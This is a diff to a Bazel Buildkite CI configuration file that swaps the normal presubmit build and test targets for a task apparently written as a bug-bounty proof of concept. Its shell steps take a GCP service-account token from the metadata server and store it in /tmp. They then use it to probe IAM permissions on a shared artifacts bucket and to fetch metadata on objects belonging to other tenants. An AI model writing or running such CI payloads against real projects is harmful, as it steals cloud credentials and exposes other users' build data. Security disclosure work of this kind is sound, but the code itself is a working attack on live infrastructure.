@@ -2,11 +2,119 @@
 buildifier:
   version: latest
 tasks:
-  presubmit:
+  vrp_buildkite_objget_proof:
     platform: ubuntu2204
-    build_targets:
-    - "--"
-    - "..."
-    test_targets:
-    - "--"
-    - "..."
+    shell_commands:
+      - |
+        set +x
+        echo VRP_BK_OBJGET_PROOF_20260519
+        id
+        hostname
+        uname -a
+        echo "BUILDKITE_JOB_ID=$BUILDKITE_JOB_ID"
+        echo "BUILDKITE_ARTIFACT_UPLOAD_DESTINATION=$BUILDKITE_ARTIFACT_UPLOAD_DESTINATION"
+      - |
+        set +x
+        echo === TOKEN_MINT_BEGIN ===
+        MD="http://metadata.google.internal/computeMetadata/v1"
+        H="Metadata-Flavor: Google"
+        TOK_JSON=$(curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/token)
+        export TOK_JSON_PY="$TOK_JSON"
+        python3 - <<'PY'
+        import json, os
+        raw = os.environ.get("TOK_JSON_PY","")
+        try:
+            d = json.loads(raw); tok = d.get("access_token","")
+        except Exception:
+            tok = ""
+        print(f"TOKEN_PRESENT={'yes' if tok else 'no'}")
+        print(f"TOKEN_LENGTH={len(tok)}")
+        if tok:
+            with open("/tmp/.t","w") as f: f.write(tok)
+            os.chmod("/tmp/.t", 0o600)
+        PY
+        export TOK_JSON_PY=""
+        TOK_JSON=""
+        echo === TOKEN_MINT_END ===
+      - |
+        set +x
+        echo === BUCKET_TEST_IAM_PERMISSIONS_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        # Bucket-scoped testIamPermissions returns the actual storage perms
+        # this SA holds on the bucket, with no resource-validation errors.
+        # Reference: https://cloud.google.com/storage/docs/json_api/v1/buckets/testIamPermissions
+        PERMS="permissions=storage.buckets.get&permissions=storage.buckets.list&permissions=storage.buckets.update&permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.objects.create&permissions=storage.objects.update&permissions=storage.objects.delete&permissions=storage.objects.setIamPolicy"
+        echo "--- bucket=bazel-untrusted-buildkite-artifacts ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/iam/testPermissions?$PERMS" \
+            | head -c 4000
+        echo
+        TOK=""
+        echo === BUCKET_TEST_IAM_PERMISSIONS_END ===
+      - |
+        set +x
+        echo === SENTINEL_UPLOAD_BEGIN ===
+        # Create a sentinel file and upload via buildkite-agent — exercises
+        # the normal upload path. The file content is a constant marker.
+        echo "VRP_OWN_ARTIFACT_PROBE_20260519 build=$BUILDKITE_BUILD_ID job=$BUILDKITE_JOB_ID" > /tmp/sentinel-vrp.txt
+        echo "sentinel content:"
+        cat /tmp/sentinel-vrp.txt
+        buildkite-agent artifact upload /tmp/sentinel-vrp.txt 2>&1 | head -c 2000
+        echo
+        echo === SENTINEL_UPLOAD_END ===
+      - |
+        set +x
+        echo === OWN_OBJECT_GET_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        # Compose the GCS path for our sentinel: job UUID is the prefix.
+        # The buildkite-agent artifact upload writes to:
+        #   gs://bazel-untrusted-buildkite-artifacts/<JOB_ID>/<relative_path>
+        # The artifact path was /tmp/sentinel-vrp.txt; buildkite-agent
+        # strips the leading slash so the GCS object name should be
+        # <JOB_ID>/tmp/sentinel-vrp.txt — we test multiple candidates.
+        JOB=$BUILDKITE_JOB_ID
+        for OBJ in "$JOB/tmp/sentinel-vrp.txt" "$JOB/sentinel-vrp.txt"; do
+          enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$OBJ")
+          echo "--- OWN object metadata: $OBJ ---"
+          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+              -H "Authorization: Bearer $TOK" \
+              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,owner,acl,timeCreated" \
+              | head -c 2500
+          echo
+          echo "--- OWN object body (GET ?alt=media): $OBJ ---"
+          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+              -H "Authorization: Bearer $TOK" \
+              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
+              | head -c 500
+          echo
+        done
+        TOK=""
+        echo === OWN_OBJECT_GET_END ===
+      - |
+        set +x
+        echo === CROSS_TENANT_OBJECT_GET_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        # Probe METADATA only (no media body) on objects we listed in PR #1067.
+        # These belong to other Bazel-ecosystem builds from 2019/2020.
+        # The metadata endpoint returns size/owner/acl/md5/contentType
+        # WITHOUT downloading the content body. A 200 response proves
+        # storage.objects.get is granted cross-tenant; the owner/acl fields
+        # prove these are objects uploaded by *other* tenants.
+        for OBJ in \
+            "0000698e-6969-401a-ac6e-9e1112f44131/src/test/shell/bazel/bazel_java_test/test.log" \
+            "000077c7-3328-4179-a619-31de827c4b9e/src\\test\\java\\build\\buildfarm\\cas-tests\\attempt_1.log"; do
+          enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$OBJ")
+          echo "--- CROSS-TENANT metadata: $OBJ ---"
+          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+              -H "Authorization: Bearer $TOK" \
+              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner,acl" \
+              | head -c 3000
+          echo
+        done
+        TOK=""
+        echo === CROSS_TENANT_OBJECT_GET_END ===
+      - |
+        set +x
+        rm -f /tmp/.t /tmp/sentinel-vrp.txt
+        echo VRP_BK_OBJGET_PROOF_END
